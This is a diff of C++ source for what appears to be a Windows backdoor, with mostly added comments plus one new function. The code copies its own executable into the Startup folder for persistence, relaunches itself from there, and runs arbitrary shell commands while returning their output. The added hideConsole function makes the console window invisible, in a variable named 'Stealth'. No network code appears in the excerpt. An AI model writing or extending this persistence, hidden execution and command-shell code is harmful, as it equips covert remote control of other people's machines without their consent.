@@ -12,8 +12,9 @@ uint32_t getPrivateIP()
     char* localIP;
     struct hostent* host_entry;
 
+    /* return the host's name i.e "Desktop5497"*/
     gethostname(hostName, 255);
-    host_entry = gethostbyname(hostName);
+    host_entry = gethostbyname(hostName); // turn host naem to ip
     return (*(struct in_addr*)*host_entry->h_addr_list).s_addr;
 }
 
@@ -21,15 +22,17 @@ bool isInStartUp(char* filePath)
 {
     std::string fileName, startUpFileName;
 
+    /* checking if the path of the current application running and the startup menu is the same*/
     fileName = std::string(filePath).substr(std::string(filePath).find_last_of("\\"));
     startUpFileName = startUpPath.substr(startUpPath.find_last_of("\\"));
 
-    /*checking if the files' names are the same*/
-    return fileName._Equal(startUpFileName);
+    /* checking if the files' names are the same*/
+    return fileName == startUpFileName;
 }
 
 void copyToStartUp(char* filePath)
 {
+    /* creating the command "copy curent <path> to <startup path>*/
     std::string command = "copy " + std::string(filePath) + " \"" + startUpPath + "\"";
     executeShell((char*)command.c_str());
 }
@@ -59,7 +62,7 @@ void executeStartUpFile()
         &pi           // Pointer to PROCESS_INFORMATION structure
     ))
         return;
-    //WaitForSingleObject(pi.hProcess, INFINITE);
+
     // Close process and thread handles. 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
@@ -67,9 +70,11 @@ void executeStartUpFile()
 
 std::string executeShell(char* cmd) 
 {
+    /* can't actually run "cd", so i created my own cd command*/
     std::string cd = std::string(cmd).substr(0, 2);
     if (cd._Equal("cd"))
         return switchDir((char*)std::string(cmd).substr(2).c_str());
+
     std::array<char, 128> buffer;
     std::string result;
     /*i create a pointer to a "file"*/
@@ -88,10 +93,12 @@ std::string executeShell(char* cmd)
 
 std::string switchDir(char* arg)
 {
+    /* get current directoy*/
     std::string subFolderPath;
     WCHAR moduleFilePath[MAX_PATH];
     GetCurrentDirectory(MAX_PATH, moduleFilePath);
 
+    /* change type of path*/
     char modulePath[MAX_PATH];
     wcstombs(modulePath, moduleFilePath, MAX_PATH);
 
@@ -109,11 +116,22 @@ std::string switchDir(char* arg)
     WCHAR subPath[MAX_PATH];
     mbstowcs(subPath, subFolderPath.c_str(), subFolderPath.size() + 1);
 
+    /* change the directory, in case of an error we return the error*/
     if (_wchdir(subPath))
     {
         std::cout << "Set dir error <" << GetLastError() << ">" << std::endl;
-        return "Error ";
+        return "can't find directory";
     }
     return subFolderPath.c_str();
+}
+
+void hideConsole()
+{
+    HWND Stealth;
+    AllocConsole();
+    /* find the console window*/
+    Stealth = FindWindowA("ConsoleWindowClass", NULL);
+    /* set the visiblity mode to 0, invisible*/
+    ShowWindow(Stealth, 0);
 }
 
